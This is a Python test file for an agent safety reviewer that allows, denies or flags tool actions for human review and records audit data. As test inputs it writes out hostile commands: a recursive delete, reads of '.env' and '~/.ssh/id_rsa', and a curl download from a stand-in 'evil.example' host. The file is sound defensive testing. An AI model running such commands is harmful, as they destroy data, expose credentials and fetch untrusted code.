"""Tests for structured OpenClaw safety review decisions."""

from __future__ import annotations

import hashlib

from trpc_agent_sdk.server.openclaw import SafetyReviewer


def _assert_review(
    *,
    source: str,
    action_type: str,
    decision: str,
    rule_id: str,
    finding: str,
    risk_level: str,
    tool_name: str = "test_tool",
    allowed_domains: tuple[str, ...] = ("api.example.com",),
) -> None:
    reviewer = SafetyReviewer(allowed_domains=allowed_domains)

    review = reviewer.review(source, action_type=action_type, tool_name=tool_name)
    blocked = decision in {"deny", "needs_human_review"}

    assert review.decision == decision
    assert review.rule_id == rule_id
    assert finding in review.finding

    assert review.report["decision"] == decision
    assert review.report["rule_id"] == rule_id
    assert review.report["finding"] == review.finding
    assert review.report["risk_level"] == risk_level
    assert review.report["tool_name"] == tool_name
    assert review.report["blocked"] is blocked
    assert isinstance(review.report["latency"], float)
    assert review.report["latency"] >= 0.0
    assert isinstance(review.report["desensitized"], bool)
    assert review.report["recommendation"]
    assert "evidence" in review.report

    assert review.audit["decision"] == decision
    assert review.audit["rule_id"] == rule_id
    assert review.audit["risk_level"] == risk_level
    assert review.audit["tool_name"] == tool_name
    assert review.audit["blocked"] is blocked
    assert isinstance(review.audit["latency"], float)
    assert review.audit["latency"] >= 0.0
    assert isinstance(review.audit["desensitized"], bool)
    assert review.audit["action_type"] == action_type
    assert review.audit["input_sha256"] == hashlib.sha256(source.encode("utf-8")).hexdigest()
    assert review.audit["allowed_domains"] == sorted(allowed_domains)
    assert rule_id in review.audit["rules_evaluated"]


def test_safe_python_allows_and_reports_audit() -> None:
    source = "result = sum([1, 2, 3])\nprint(result)"

    _assert_review(
        source=source,
        action_type="python",
        decision="allow",
        rule_id="safe_python",
        finding="No risky code",
        risk_level="none",
    )


def test_dangerous_delete_blocks_with_rule_finding_report_and_audit() -> None:
    source = "rm -rf /tmp/project"

    _assert_review(
        source=source,
        action_type="bash",
        decision="deny",
        rule_id="dangerous_delete",
        finding="Destructive delete",
        risk_level="critical",
    )


def test_read_dotenv_blocks_with_rule_finding_report_and_audit() -> None:
    source = "from pathlib import Path\nprint(Path('.env').read_text())"

    _assert_review(
        source=source,
        action_type="python",
        decision="deny",
        rule_id="read_dotenv",
        finding="environment secret file",
        risk_level="high",
    )


def test_read_home_ssh_blocks_with_rule_finding_report_and_audit() -> None:
    source = "cat ~/.ssh/id_rsa"

    _assert_review(
        source=source,
        action_type="bash",
        decision="deny",
        rule_id="read_ssh",
        finding="SSH credentials",
        risk_level="critical",
    )


def test_allowlisted_network_request_allows_with_rule_finding_report_and_audit() -> None:
    source = "import requests\nrequests.get('https://api.example.com/v1/status')"

    _assert_review(
        source=source,
        action_type="python",
        decision="allow",
        rule_id="network_allowlist",
        finding="allowlisted domain",
        risk_level="none",
    )


def test_non_allowlisted_network_request_blocks_with_rule_finding_report_and_audit() -> None:
    source = "curl https://evil.example/download"

    _assert_review(
        source=source,
        action_type="bash",
        decision="deny",
        rule_id="network_not_allowlisted",
        finding="non-allowlisted domain",
        risk_level="high",
    )


def test_subprocess_blocks_with_rule_finding_report_and_audit() -> None:
    source = "import subprocess\nsubprocess.run(['sh', '-c', 'echo hi'])"

    _assert_review(
        source=source,
        action_type="python",
        decision="deny",
        rule_id="subprocess_execution",
        finding="Subprocess execution",
        risk_level="high",
    )


def test_pip_install_requires_review_with_rule_finding_report_and_audit() -> None:
    source = "python -m pip install requests"

    _assert_review(
        source=source,
        action_type="bash",
        decision="needs_human_review",
        rule_id="package_install",
        finding="Package installation",
        risk_level="medium",
    )


def test_infinite_loop_blocks_with_rule_finding_report_and_audit() -> None:
    source = "while True:\n    pass"

    _assert_review(
        source=source,
        action_type="python",
        decision="deny",
        rule_id="infinite_loop",
        finding="unbounded loop",
        risk_level="high",
    )


def test_sensitive_information_output_blocks_with_rule_finding_report_and_audit() -> None:
    source = "api_key = 'sk-live-secret'\nprint(api_key)"

    reviewer = SafetyReviewer(allowed_domains=("api.example.com",))
    review = reviewer.review(source, action_type="python", tool_name="secret_tool")

    assert review.decision == "deny"
    assert review.rule_id == "sensitive_output"
    assert "sensitive information output" in review.finding
    assert review.report["decision"] == "deny"
    assert review.report["rule_id"] == "sensitive_output"
    assert review.report["finding"] == review.finding
    assert review.report["risk_level"] == "high"
    assert review.report["tool_name"] == "secret_tool"
    assert review.report["blocked"] is True
    assert isinstance(review.report["latency"], float)
    assert isinstance(review.report["desensitized"], bool)
    assert review.audit["decision"] == "deny"
    assert review.audit["rule_id"] == "sensitive_output"
    assert review.audit["risk_level"] == "high"
    assert review.audit["tool_name"] == "secret_tool"
    assert review.audit["blocked"] is True
    assert isinstance(review.audit["latency"], float)
    assert isinstance(review.audit["desensitized"], bool)
    assert review.audit["action_type"] == "python"
    assert review.audit["input_sha256"] == hashlib.sha256(source.encode("utf-8")).hexdigest()
    assert "sk-live-secret" not in str(review.report)
    assert "sk-live-secret" not in str(review.audit)


def test_bash_pipe_requires_review_with_rule_finding_report_and_audit() -> None:
    source = "printf 'hello' | wc -c"

    _assert_review(
        source=source,
        action_type="bash",
        decision="needs_human_review",
        rule_id="bash_pipe",
        finding="Bash pipeline",
        risk_level="medium",
    )


def test_human_review_scenario_requires_review_with_rule_finding_report_and_audit() -> None:
    source = "sudo systemctl restart production-api"

    _assert_review(
        source=source,
        action_type="bash",
        decision="needs_human_review",
        rule_id="human_review_required",
        finding="requires human review",
        risk_level="medium",
    )
